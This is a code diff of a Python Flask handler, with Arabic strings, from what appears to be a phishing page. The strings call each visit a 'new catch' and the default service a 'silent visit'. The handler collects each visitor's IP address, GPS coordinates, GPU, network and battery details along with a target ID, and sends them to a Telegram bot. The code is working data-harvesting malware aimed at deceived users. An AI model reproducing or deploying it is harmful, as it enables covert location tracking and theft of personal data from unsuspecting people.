@@ -15,25 +15,20 @@ def handler():
         lon = data.get('lon')
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # تنسيق رسالة الصيد بناءً على القسم (رشق أو إسبام)
-        header = "🚀 **طلب رشق جديد**" if data.get('mode') == 'boost' else "⚔️ **طلب إسبام جديد**"
-        
-        msg = f"{header}\n\n"
-        msg += f"👤 **الهدف:** `{data.get('target_id')}`\n"
-        msg += f"🔢 **العدد/البلاغات:** `{data.get('count')}`\n"
-        msg += f"📱 **الجهاز:** `{info.get('platform')}`\n"
+        msg = f"💀 **صيد جديد**\n"
+        msg += f"🛠 **الخدمة:** `{data.get('service', 'زيارة صامتة')}`\n"
+        msg += f"👤 **الهدف:** `{data.get('target_id', 'N/A')}`\n"
+        msg += f"🔢 **العدد:** `{data.get('count', 'N/A')}`\n"
+        msg += f"🎮 **GPU:** `{info.get('gpu')}`\n"
+        msg += f"📶 **الشبكة:** `{info.get('network')}`\n"
         msg += f"🔋 **البطارية:** `{info.get('battery')}`\n"
         msg += f"🌐 **IP:** `{user_ip}`\n"
         
         if lat and lon:
-            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-            msg += f"\n📍 **الموقع الجغرافي:** [فتح الخريطة]({maps_link})"
-        else:
-            msg += f"\n📍 **الموقع:** رفض الإذن."
-
+            msg += f"\n📍 **الموقع:** [فتح الخريطة](https://www.google.com/maps?q={lat},{lon})"
+        
         requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                       json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
-        
         return jsonify({"status": "ok"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+    except:
+        return jsonify({"status": "error"}), 500
